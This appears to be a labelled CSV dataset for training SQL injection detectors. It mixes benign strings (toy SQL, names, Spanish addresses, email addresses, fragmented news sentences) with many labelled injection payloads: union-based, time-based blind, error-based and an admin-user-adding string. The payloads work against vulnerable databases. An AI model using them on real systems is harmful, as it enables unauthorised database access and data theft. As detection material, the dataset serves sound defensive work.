Query,Label
"select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",1
SELECT TOP 3 * FROM hurt,0
"-5193 where 2175 = 2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",1
1'||  (  select 'gdzt' where 4950  =  4950,1
des9o89451rac28,0
"select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1
diocles,0
SELECT AVG ( wrote )  FROM composition  SELECT SUM ( wore ),0
"agullana 65, 13?c",0
29061025l,0
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'cxor' = 'cxor",1
"select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",1
Among pressing relaxation restrictions passengers &apos; use devices Amazon,0
3580665595349534,0
17154,0
"vall de bianya, la",0
fuente el olmo de scar,0
alcal de la vega,0
prucha@comerciosaspe.ps,0
heintje0@alpesfranceses.com.ro,0
"c/ tamesis 39, 1?c",0
leocricia,0
"-2287'  )  )   union all select 1200,1200,1200,1200,1200#",1
1 deadline set The Hague-based organization Damascus destroy &quot; render inoperable &quot; chemical weapon production facilities machinery mixing chemicals poison gas filling munitions,0
DELETE FROM examine,0
santaren,0
Anticipation attack: This also Obama &apos;s drone philosophy practices work,0
1   )    )    as ctqr where 2609  =  2609,1
"1""   )    )    as hfma where 2654  =  2654 and make_set  (  8403  =  8403,8899  )  --",1
"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1'  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 'vtoi' like 'vtoi,1
"-2518' union all select 6818,6818,6818,6818,6818,6818#",1
"1""  )  )   as kmss where 3214 = 3214 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
cagarria,0
30666350j,0
"-5204"" )  union all select 7186,7186,7186--",1
SELECT * FROM yourself WHERE favorite NOT LIKE '[farmer]%',0
larguey@erasmusrooms.qa,0
1  )   as itvm where 1482  =  1482,1
husky_hurlic@ropadegolf.sn,0
mandel_lanctot@elrincondelmarmol.bu,0
"Mr Alderson , Keighley , added: &quot; We scared might fall stayed",0
"1""  )   and elt  (  4249  =  4249,7259  )   and   (  ""xgka"" like ""xgka",1
"This reported Interfax Agency reference groups aware situation , named greater detail",0
merriell,0
Hoarding Bechtle plot painted A group belonging &quot; Schweizer Wiese &quot; citizen &apos;s initiative given hoarding Bechtle plot spa promenade Bad Herrenalb face-lift,0
-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,1
"-8124  )   union all select 7251,7251,7251#",1
389,0
bunyola,0
brana@housemovie.id,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",1
Or defend economic interests - includes telling Berlin Brussels get,0
"-8325  )  )   as ajxq where 6630 = 6630 union all select 6630,6630,6630,6630,6630,6630--",1
50678,0
"That means one passenger line Frontier gate might get bring bag free , next person line might owe $ 100 similar bag",0
"1' )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( 'osov' like 'osov",1
"1%'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '",1
rub de bracamonte,0
8534,0
"SELECT column_name ( s )  FROM show,solve",0
-3026 )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  ),1
1%' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ',1
garner3,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( ""jwzy"" = ""jwzy",1
"1' )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( 'rgue' like 'rgue",1
SELECT AVG ( together ) FROM idea SELECT SUM ( bowl ),0
"1'|| ( select 'fzcu' where 9252 = 9252 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  ||'",1
"1 )  union all select null,null,null#",1
SELECT * FROM fox FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM bread,0
xiaojing,0
1%'   )    )    union all select null#,1
fiodorov@contactomujeres.kr,0
1%'  )  )   )  union all select null--,1
damisa,0
blasinda,0
"-8093""   )    )    as oboi where 1476  =  1476 union all select 1476,1476,1476,1476#",1
1'  )   where 1502  =  1502 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
SELECT * FROM habit WHERE empty = 'wish'  AND City = 'stopped',0
"SELECT Employees.warm, COUNT ( Orders.twoID )  AS diagramFROM    ( OrdersINNER JOIN shadow ON Orders.pondID  =  Employees.norID )",0
6991,0
ateniesa,0
SELECT * FROM general WHERE easy  BETWEEN 10 AND 20,0
ohenry.ridofi2@e-b-s.gr,0
1'  )   where 2330  =  2330 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
"Ulrich Hackenberg , board member carmaker Audi , says standard practice years mobile phones collected board meetings cannot used remote listening devices",0
16806738v,0
20100,0
"1%'  )  )   and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  '%' = '",1
"1%""  )  )   )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
&quot; It immediately clear facility Safira one two sites OPCW inspectors able visit,0
92283149l,0
barnechea,0
88356550a,0
bauls san marful,0
SELECT * FROM no WHERE heard NOT LIKE '[dog]%',0
SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity',0
SELECT COUNT ( gray )  FROM stems,0
marrupe,0
"c/ la haya, 109 13-d",0
calle estafeta 105 6c,0
3527135091788318,0
"-2168""  )  )   union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",1
granera,0
12772631h,0
SELECT from ( s )  FROM duty,0
1503380000000000,0
6038552435376719,0
"1 union all select null,null,null,null,null,null--",1
"SELECT * FROM discuss WHERE spread NOT IN  ( 'short', 'shore', 'wealth' )",0
01212,0
38350,0
372,0
"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'aytf' like 'aytf",1
44394,0
banerjee6@getgold.ec,0
"Following great success musical , &quot; Rock Life &quot; , enthused audiences past Spring , Liederkranz bless two church services performance Franz Schubert &apos;s Deutsche Messe , close anniversary year celebrations",0
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""pmmr""  =  ""pmmr",1
"select * from users where id = 1 union select 1<@.,version (  )  -- 1",1
"-4327"" or make_set ( 3107 = 1781,1781 )  and ""lclf"" like ""lclf",1
27404814s,0
f,0
"1  )   where 5550  =  5550   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
1' )  as xiqw where 8507 = 8507 rlike sleep ( 5 ) --,1
7519310000000000,0
25270,0
alienacin,0
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262329 )  ORDER BY meta_id ASC",0
"estrada mendiarte s/n, 10?a",0
"-2254' )  as dyrv where 9079 = 9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",1
celio,0
"SELECT * FROM heavy WHERE compare NOT IN  ( 'team', 'attack', 'underline' )",0
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'vgkt'  =  'vgkt",1
ayoroa,0
"elt ( 2427 = 2427,5518 )",1
picsearch,0
"1%""  )  )   )  union all select null,null,null,null,null,null,null,null,null,null#",1
or username like '%,1
getulio,0
1   )    )    as qlkf where 6635  =  6635,1
"Their motto , large billboard stated &quot; We unfinished buildings &quot;",0
"iif  (  4436  =  8910,1,1/0  )",1
SELECT * FROM rise,0
"1""  )   as ypfa where 6128  =  6128",1
1'   )    )    as dago where 9788  =  9788,1
SELECT * FROM fuel FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM told,0
6815,0
pbkim,0
azema.alvir@telogis.gf,0
1%'   )    )    or sleep  (  5  )  #,1
SELECT * FROM drew WHERE food = 'nearly'  AND  ( principle = 'year' OR good = 'subject' ),0
1  )  )   rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (  4279 = 4279,1
5218,0
45794073s,0
"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1
4422802563710608,0
SELECT TOP 50 PERCENT * FROM remember,0
select sleep ( 5 )  and   (  (  'uyft' = 'uyft,1
10898485g,0
"1"" where 1537 = 1537 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
"1' )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( 'gfxr' = 'gfxr",1
"Rumours affair involving Clarke first picked NotW &apos;s features desk source sexually interested Ms Pawlby told: &quot; Don &apos;t bother wasting time , &apos;s Charles",0
debever@viajesparamujeres.es,0
SELECT TOP 3 * FROM through WHERE thousand = 'slow',0
1'  )   where 5287  =  5287 and 7533  =  7533--,1
SELECT dream ( s )  FROM folks SELECT fewer ( s ),0
eberto,0
vikram,0
SELECT * FROM grain FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM forest,0
fabricia,0
"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,1
morgan,0
1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  #,1
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and  ( 'fnon' like 'fnon",1
hi' or 1 = 1 --,1
SELECT * FROM that  WHERE suddenly = connected,0
1'+  (  select kfmv where 1679  =  1679,1
hi' or 1 = 1 --,1
brent@ladigianni.cc,0
3362439041972349,0
select  ( case when  ( 2783 = 9216 )  then 1 else 2783* ( select 2783 from master..sysdatabases )  end ) --,1
"&quot; In case I &apos;ve caused damages Zoomlion also whole news media industry ability earn public &apos;s trust , &quot; told state broadcaster CCTV",0
pijahumeda,0
"1"" )  as jidc where 6093 = 6093 and 9198 = 9198--",1
"1""   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
select  ( case when  ( 8234 = 2498 )  then 8234 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
tahsin,0
or 1  =  1 --,1
SELECT TOP 3 * FROM fruit WHERE met = 'religious' SELECT * FROM addition,0
"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,1
"-2951"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )",1
"SELECT YEAR ( ""2017-06-15"" ) ;",0
4945,0
"SELECT pilotID AS ID, duty AS middle FROM concerned",0
96622444l,0
"-7531' )  union all select 3072,3072,3072,3072,3072,3072,3072--",1
SELECT AVG ( angry )  FROM bend  SELECT SUM ( palace ),0
hoel,0
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",1
"SELECT Orders.gamerID, Employees.offer, Employees.fast FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.tookID ORDER BY Orders.definitionID",0
"INSERT INTO stay  ( pond, desk, addition )  VALUES  ( 'lunch', 'completely', 'active' )",0
steinfeld@multireform.sg,0
8un03a,0
quality,0
"1%""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""%""  =  """,1
carlos tomas romero 130,0
"' || myappadmin.adduser ( 'admin', 'newpass' )  || '",1
"It perfect , lies",0
SELECT DISTINCT force FROM lonely,0
p81i4uer3o,0
SELECT * FROM bring FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM again,0
c/ nuestra seora de la cabeza 153 1?f,0
kathrine,0
"And, course, much force withdrawn proper life",0
SELECT else ( s FROM since RIGHT JOIN,0
"camio do monte 147, 10?h",0
"Frontier &apos;s new carry-on fee &apos;t start summer , though date &apos;t set",0
"UPDATE bag SET bottom =  'pie', City =  'yet' WHERE mixture =  heading",0
5r32n7,0
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm",1
"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""uquh""  =  ""uquh",1
"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'fjfo' = 'fjfo",1
"1""  )  )   )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
kin-yee,0
"select * from users where id = 1 or 1#""{ union select 'a',version (  )  -- 1",1
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # ehsr",1
valcour@piensoparaperros.dj,0
"c/ alfonso de armas ayala s/n,",0
caster@videotubo.pr,0
"SELECT * FROM needs WHERE pleasant BETWEEN ""fewer"" AND    ""blood""",0
"1'+ ( select 'vabj' where 7178 = 7178 union all select null,null,null,null,null#",1
"1  )  )   )  union all select null,null,null,null,null,null,null--",1
"1 )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
puebla de don fadrique,0
luthin,0
"calle santa teresa, 87 5?b",0
"SELECT articleID AS ID, planning AS thousand FROM related",0
"&quot; I spend lot time reassuring parents -- usually , signal rapid progression full puberty , &quot; said Kaplowitz",0
07694,0
end and  ( 9416 = 9416,1
1  )  )   as eveb where 7567 = 7567,1
"1%'  )  )   and make_set ( 6527 = 9529,9529 )  and   (  (  '%' = '",1
1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
"1"" )  where 7471 = 7471 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
There 201 cardinals,0
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )",1
"&quot; CASA currently specific regulations governing use electronic devices aircraft , &quot; said",0
select pg_sleep ( 5 )  and   (  (   ( 'qslr' = 'qslr,1
-8328 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # rlva,1
"-1922%' )  union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",1
"-8200' where 3422  =  3422 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
62123000t,0
)   or   (  a  =  a,1
"If municipalities agree reconstruction measures , required contribute one third costs , remainder divided Deutsche Bahn Federal Government",0
tracee,0
"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",1
"According police , 63-year-old man suddenly stepped pub onto footpath , cyclist unable brake time",0
mebine,0
40133,0
"""-""",1
-8636'   )    )     )   or 4301  =  7212--,1
virginia,0
"1%'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
m,0
73,0
"select * from users where id = 1 or 1#""1 union select null,version (  )  -- 1",1
&,1
reiner,0
SELECT * FROM practical  WHERE front NOT LIKE '[exact]%',0
SELECT AVG ( change )  FROM new  SELECT SUM ( spirit ),0
76591879q,0
suen,0
SELECT describe ( s )  FROM hay FULL OUTER JOIN,0
"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-6436' in boolean mode )  union all select 7589,7589,7589,7589--",1
h8ber,0
select * from users where id = '1' or !<@ or 1 = 1 -- 1',1
zein,0
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'oofd'  =  'oofd,1
nimia,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
enaciado,0
"1  )   as zhvx where 3171  =  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
1'||  (  select 'gved' from dual where 6965  =  6965,1
-4828%' )  or 8678 = 5745#,1
"So God armed youth puberty manhood less piquancy charm, made enviable gracious claims put by, stand itself",0
15807509t,0
SELECT * FROM hunter WHERE off = 'either'  AND  ( thing = 'little' OR each = 'question' ),0
SELECT * FROM location WHERE stopped  BETWEEN 10 AND 20,0
"select * from users where id = 1 union select @ $$,version (  )  -- 1",1
"1%"" )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( ""%"" = """,1
rudie@deuxmanagement.jo,0
"1 where 4944  =  4944 union all select null,null,null,null,null,null,null,null,null#",1
SELECT * FROM mill,0
"1 and elt ( 8853 = 1675,1675 ) -- jegm",1
tefilo,0
-9840'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'dzlp' = 'dzlp,1
They face prison sentences 10 years life imprisonment convicted,0
SELECT * FROM onto WHERE in BETWEEN '1996-07-01' AND '1996-07-31',0
6308702892604693,0
)    )    or    (    (   'x'   )    )     =     (    (   'x,1
SELECT COUNT ( herself )  FROM bush,0
limitable,0
"Only several hundred supporters gathered outside court cheer new president , departure presidential pomp Mubarak years , traffic briefly halted allow motorcade usually busy road linking city centre southern suburbs",0
SELECT COUNT ( my ) FROM wheel,0
8a86ra7,0
1'+  (  select 'iqxn' where 1146  =  1146 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',1
SELECT camp FROM off,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (  4142 = 4142",1
SELECT AVG ( touch ) FROM then,0
0 or 1 = 1,1
SELECT LAST_INSERT_ID (  ),0
5i852469,0
"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,1
"The jury heard Thursday Coulson confronted Mr Blunkett affair married woman seeing co-defendant Rebekah Brooks , married time",0
South Stream meant add diversity Russia &apos;s export routes Europe,0
FROM  ( SELECT DISTINCT soldier FROM mail ),0
"c/ andres piquer 175, 2?b",0
"1 union all select null,null,null,null,null,null,null,null,null#",1
dels,0
valeika@italianmotorvillagesevilla.gd,0
zahira,0
-9100  )   or 8792  =  9550--,1
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ),1
"1'|| ( select 'fqoz' where 9794 = 9794 union all select null,null,null,null,null--",1
benfield@chuecafamily.gs,0
"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,1
2.11181E+015,0
noviercas,0
"1'||  (  select 'rfjl' where 2476  =  2476 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1
"select * from users where id = 1 or \.<  = 1 union select 1,@@VERSION -- 1",1
